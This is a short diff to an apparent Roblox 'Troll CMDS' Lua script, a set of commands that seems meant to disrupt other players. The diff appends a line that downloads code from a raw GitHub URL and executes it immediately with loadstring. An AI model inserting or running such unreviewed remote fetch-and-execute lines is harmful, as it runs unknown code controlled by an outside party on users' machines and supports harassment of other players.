@@ -65,3 +65,4 @@ plrs.PlayerAdded:Connect(function(t)
 end)
 
 print("[Troll CMDS: Loaded]\n[/br, /rs, /fz, /kc, /ms]")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ancient2k3/Status/refs/heads/main/Events/Notification.lua"))()
